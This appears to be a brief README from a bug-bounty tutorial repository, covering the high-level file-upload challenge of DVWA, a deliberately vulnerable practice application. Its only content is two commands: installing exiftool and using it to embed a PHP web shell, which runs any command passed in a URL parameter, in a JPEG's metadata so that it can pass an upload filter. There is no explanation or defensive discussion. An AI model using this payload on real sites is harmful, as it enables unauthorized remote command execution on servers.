# bug-bounty-tutorial
bug bounty tutorial

## 3.dvwa file upload high
```
apt-get install exiftools

exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' index.jpeg


```
